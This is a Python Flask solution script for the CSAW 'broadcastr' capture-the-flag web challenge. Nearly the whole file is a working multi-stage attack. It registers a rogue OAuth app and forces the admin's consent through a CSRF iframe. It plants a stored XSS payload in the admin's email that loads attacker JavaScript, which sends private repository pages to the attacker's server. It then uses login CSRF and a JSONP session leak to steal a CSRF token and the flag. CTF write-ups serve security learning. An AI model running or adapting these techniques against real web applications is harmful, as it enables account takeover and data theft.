"""
Solution script
Sovles both parts of the challenge.

First it sets up the OAuth2 client and registers an app with the broadcastr server.

It runs a flask server to recive the OAuth data, and later send payloads.

Once we direct the user to our OAuth endpoint, we load a CSRF iframe, which contains
a request to allow the client.

With auth granted, we can change the admin's email to a xss payload.

With the xss we can read the private repo.
That is the end of part one.

Now we can read the flag service source code.
The code is pretty simple. We can CSRF to login the admin, but cannot call /flag due
to the csrf token.

Using the debug page, we can steal any values from the session, by setting _redirect to
`('` and the username to `')`, thus making the page valid javascript and loading it as
jsonp.

Doing this gives us the CRSF token, which we can use to request the flag.
We still can't read it because of SOP, so we use the session leak again.
"""

from flask import Flask, render_template, session, abort, jsonify, redirect, url_for, request, Response
from flask_oauthlib.client import OAuth

import requests,urllib

import os,re
os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'



# URL of boardcastr
TARGET = 'http://broadcastr.chal.csaw.io:4000/'
# URL of source bucket
TARGET2 = 'http://bucket.broadcastr.chal.csaw.io:4000/'
# URL of flag server (localhost)
TARGET3 = 'http://127.0.0.1:3000'
# URL of attacking server
LOCAL = 'http://172.17.0.1:2000'

# Broadcastr username and password
USERNAME = 'a'
PASSWORD = 'a'


def registerOauthApp():
    # Create the application (This would be manually done normally)
    print "\033[96m[+] Creating OAuth2 Application\033[0m"
    s = requests.session()
    s.post(TARGET+'/login',data={'username':USERNAME,'password':PASSWORD})
    r = s.get(TARGET+'/app')
    csrf = r.text.split('"_csrf_token" value="')[1].split('"')[0]
    r = s.post(TARGET+'/app',data={
        'name':'bad','desc':'bad','redirect':LOCAL+'/login/authorized',
        'scope':'user:info:write','_csrf_token':csrf})
    CLIENT_ID = r.text.split('<pre>')[1].split('</pre>')[0]
    print "\033[92m[+] Successfully Registered OAuth2 Application. Client ID = %s\033[0m"%CLIENT_ID
    return CLIENT_ID

CLIENT_ID = registerOauthApp()

app = Flask(__name__)
app.secret_key='DEVKEY'
oauth = OAuth(app)

remote = oauth.remote_app(
        'test',
        consumer_key=CLIENT_ID,
        consumer_secret='92b7cf30bc42c49d589a10372c3f9ff3bb310037',
        request_token_params={'scope': 'user:info:write'},
        base_url=TARGET+'/api',
        request_token_url=None,
        access_token_method='POST',
        access_token_url=TARGET+'/oauth/token',
        authorize_url=TARGET+'/oauth/authorize')



@app.route('/go')
def index():
    return '''
<html><body>
<script>
var stage2 = function() {
document.getElementById('s2').src="/csrf";
}
var c = 0;
var stage3 = function() {
c++;
if (c==2) {
location="/leak";
}
}
</script>
<iframe src="/login" onload="stage2()"></iframe>
<iframe id="s2" onload="stage3()"></iframe>
</body>
</html>
'''

@app.route('/csrf')
def csrf():
    return '''
<html><body>
<form action="'''+TARGET+'/oauth/authorize?'+urllib.urlencode({
    'response_type':'code',
    'client_id':CLIENT_ID,
    'redirect_uri':LOCAL+'/login/authorized',
    'scope':'user:info:write'})+'''" method="post">
    <input name="confirm" value="Yes">
</form>
<script>
document.forms[0].submit();
</script>
'''

@app.route('/leak',methods=["GET","POST"])
def leakInfo():
    if request.method=="GET":
        return redirect(TARGET2+'/profile')
    if 'data' in request.form:
        if 'file' in request.args:
            if not os.path.exists("files"):
                os.mkdir("files")
            fn = os.path.join("files",request.args['file'].replace('/','_'))
            with open(fn,'w') as f:
                f.write(request.form['data'])
            print "\033[92m[+] Leaked page %s. Saved in %s\033[0m"%(request.args['file'],fn)
            return ''
        if 'log' in request.args:
            print "\033[96m[!] Javascript Log: %s\033[0m"%repr(request.form['data'])
            return ''


        m = re.search("flag\{.*\}",request.form['data'])
        if m:
            print "\033[1;92m[+] RETRIVED FLAG! flag = %s\033[0m"%m.group(0)
            return ''

        m = re.search("csrftoken ([a-fA-F0-9]+)",request.form['data'])
        if m:
            print "\033[1;92m[+] Stole flag service CSRF token: %s\033[0m"%m.group(1)
            return ''
        else:
            print "\033[91m[!] Unexpected leak data: %s"%repr(request.form['data'])
            return ''
    print "\033[91m[!] No data in leak POST request!"
    return ''




@app.route('/login')
def login():
    return remote.authorize(callback=url_for('authorized',_external=True))

@app.route('/')
def payload():
    if not 'id' in request.args:
        return Response('''
var leak = function(data,args) {
    var http = new XMLHttpRequest();
    var url = "'''+LOCAL+'''/leak?"+args;
    var params = 'data='+encodeURIComponent(data);
    http.open("POST",url,true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send(params);
}

var log = function(data) {
    leak(data,"log");
}


var stealFlag = function() {
    _redirect = function(data) {
        leak("Response:"+data);
    }
    $.ajax({
        url:"'''+TARGET3+'''/debug",
        dataType: "jsonp"
    });
}

var stage4 = function(csrftoken) {
    var frame = document.createElement("iframe");
    frame.src="'''+LOCAL+'''/?id=3&token="+csrftoken;
    document.body.appendChild(frame);
    log("Started iframe csrf for stage4");
    setTimeout(stealFlag, 1000);
}


var stealCSRF = function() {
    _redirect = function(data) {
        leak("Response:"+data);
        var csrftoken = data.split("csrftoken ")[1].split(",")[0];
        stage4(csrftoken);
    }
    $.ajax({
        url:"'''+TARGET3+'''/debug",
        dataType: "jsonp"
    });
}

var stage3 = function() {
    var frame = document.createElement("iframe");
    frame.src="'''+LOCAL+'''/?id=2";
    document.body.appendChild(frame);
    log("Started iframe csrf for stage3");
    setTimeout(stealCSRF, 1000);
}

var stage2 = function() {
    var frame = document.createElement("iframe");
    frame.src="'''+LOCAL+'''/?id=1";
    document.body.appendChild(frame);
    log("Started iframe csrf for stage2");
    setTimeout(stage3, 1000);
}

var dumpPage = function(url,callback) {
    $.get(url,function(data) {
        leak(data,"file="+encodeURIComponent(url));
        callback();
    });
}

dumpPage("/repos", function() {
    dumpPage("/broadcastr/flag-service", function() {
        dumpPage("/broadcastr/flag-service/flagserver.py", function() {
            stage2();

        });
    });
});
    ''', mimetype='application/javascript')
    elif request.args['id'] == '1':
        return '''
<form action="'''+TARGET3+'''/login" method="POST">
<input name="user" value="admin">
<input name="pass" value="d6e2dec0eb3394a">
</form>
<script>
document.forms[0].submit();
</script>
        '''
    elif request.args['id'] == '2':
        return '''
<form action="'''+TARGET3+'''/login?_redirect=('" method="POST">
<input name="user" value="')">
</form>
<script>
document.forms[0].submit();
</script>
        '''
    elif request.args['id'] == '3':
        return '''
<form action="'''+TARGET3+'''/flag" method="POST">
<input name="token" value="'''+request.args['token']+'''">
</form>
<script>
document.forms[0].submit();
</script>
        '''

@app.route('/login/authorized')
def authorized():
    resp = remote.authorized_response()
    if resp is None or resp.get('access_token') is None:
        return 'Access denided! '+repr(request.args)+' '+repr(resp)
    session['remote_token'] = (resp['access_token'],'')

    pl = '''"><svg onload=$.getScript("'''+LOCAL.replace("http:","")+'''")>'''

    me = remote.post('/api/user/info/update',data={'email':pl},format="json")
    print me.data, '='*10
    return jsonify(me.data)


@remote.tokengetter
def get_token():
    return session.get('remote_token')



if __name__ == '__main__':
    print "\033[96m[+] Started flask server\033[0m"
    print "==== \033[1;92mSEND YOUR TARGET TO %s\033[0m ===="%(LOCAL+'/go')
    app.run(port=2000,host='0.0.0.0')
